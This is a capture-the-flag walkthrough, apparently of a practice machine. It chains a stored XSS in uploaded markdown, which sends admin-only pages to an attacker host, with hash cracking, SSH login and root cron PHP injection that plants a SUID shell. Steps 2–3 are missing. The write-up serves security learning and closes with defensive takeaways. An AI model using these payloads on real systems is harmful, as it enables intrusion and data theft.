Phase 1

Initial Access — XSS → LFI Chain

Stored XSS via Markdown Upload

The Markdown Viewer renders uploaded .md files as HTML without sanitizing embedded <script> tags. A simulated admin bot periodically visits shared links submitted through the Contact page. This gives us a stored XSS → server-side request chain.

Attack Strategy We can't access /messages.php ourselves (empty response). But the admin can. Our XSS payload will run in the admin's browser, fetch /messages.php with the admin's session cookies, and exfiltrate the response to our HTTP server.

Step 1: Exfiltrate Messages

Create a malicious markdown file and start a listener:

cool.md
# Test

<script>
fetch("http://alert.htb/messages.php",{credentials:"include"})
.then(r=>r.text())
.then(d=>fetch("http://ATTACKER_IP:8888/?data="+btoa(d)))
</script>
$ python3 -m http.server 8888

Upload the file, get the share link (e.g. /visualizer.php?link_share=6a5251c1816c31.67364946.md), and submit it to the admin via the Contact page. When the admin views it:

10.129.231.188 - - "GET /?data=PGgxPk1lc3NhZ2VzPC9oMT48dWw+PGxp... HTTP/1.1" 200

$ echo "PGgxPk1lc3Nh..." | base64 -d
<h1>Messages</h1><ul><li><a href='messages.php?file=2024-03-10_15-48-34.txt'>...</a></li></ul>

The file parameter in messages.php is a classic LFI indicator.

Step 4: Crack Hash → SSH

$ hashcat -m 1600 '$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/' \
    /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:manchesterunited
Hash Format Gotcha $apr1$ is Apache's MD5-based hash (hashcat mode 1600). Make sure to copy the full hash including the trailing / — missing a single character causes "Token length exception" errors. Use cat << 'EOF' (single-quoted heredoc) to write the hash to a file, preventing the shell from interpreting $ as variable expansion. 
$ ssh albert@alert.htb
Password: manchesterunited

albert@alert:~$ cat user.txt
ceec6840f08fbdeae7b365225dc9a301
Phase 2

Privilege Escalation — Cron PHP Code Injection

Enumeration

albert@alert:~$ id
uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)

Albert belongs to the management group. Looking for files owned by this group:

albert@alert:~$ ls -la /opt/website-monitor/
drwxrwxr-x 4 root root         4096 ...  .
drwxrwxr-x 2 root management  4096 ...  config
-rwxrwxr-x 1 root root         1452 ...  monitor.php
-rwxrwxr-x 1 root root          104 ...  monitors.json

The config/ directory is writable by the management group. Inside it:

-rwxrwxr-x 1 root management 49 ... configuration.php

Understanding the Attack Surface

monitor.php is a website monitoring script run periodically by cron as root. Its first line:

include('config/configuration.php');

It includes configuration.php, which we can control. Since the config/ directory is writable by our group, and the file itself has group write permission, we can directly edit it — or use the mv+cp trick to guarantee ownership:

$ cd /opt/website-monitor/config
$ mv configuration.php .old
$ cp .old configuration.php
# File is now owned by albert — guaranteed writable

Inject Payload

$ cat << 'EOF' > /opt/website-monitor/config/configuration.php
<?php
define('PATH', '/opt/website-monitor');
system("cp /bin/bash /tmp/b; chmod 4777 /tmp/b");
?>
EOF
Act Fast A cleanup cron job periodically resets the configuration file. The payload must be in place when monitor.php runs (every minute). If the SUID bash doesn't appear within a couple of minutes, re-inject — the file may have been restored.

Root

Within a minute, cron executes monitor.php as root, which includes our modified configuration.php, running system() as root:

albert@alert:~$ ls -la /tmp/b
-rwsrwxrwx 1 root root ... /tmp/b

albert@alert:~$ /tmp/b -p
b-5.0# whoami
root

b-5.0# cat /root/root.txt
d7c8a070fd5ccb43273f4d0c3e0d03eb
Appendix

Key Takeaways

Markdown renderers are XSS vectors.

Any system that renders user-supplied markdown to HTML must sanitize or sandbox the output. Allowing raw <script> tags turns a file upload into stored XSS.

XSS + LFI = authenticated file read.

The LFI in messages.php was only exploitable with the admin's session. XSS let us borrow that session without ever stealing a cookie — we fetched the content server-side through the admin's browser and exfiltrated it.

.htpasswd files are high-value targets.

Apache's Basic Auth stores password hashes in plaintext files on disk. If any file-read vulnerability exists, .htpasswd is one of the first things to grab. The hashes are often crackable.

Group permissions on directories enable code injection.

A root-owned PHP file in a group-writable directory is effectively group-writable — mv it away, cp it back, and the copy is yours. When that PHP file is included by a root cron job, you have root code execution.

Exfiltration needs the right encoding.

btoa() (base64) in the XSS payload preserves special characters and newlines during URL transmission. Without encoding, the exfiltrated data gets truncated or corrupted by URL parsing.
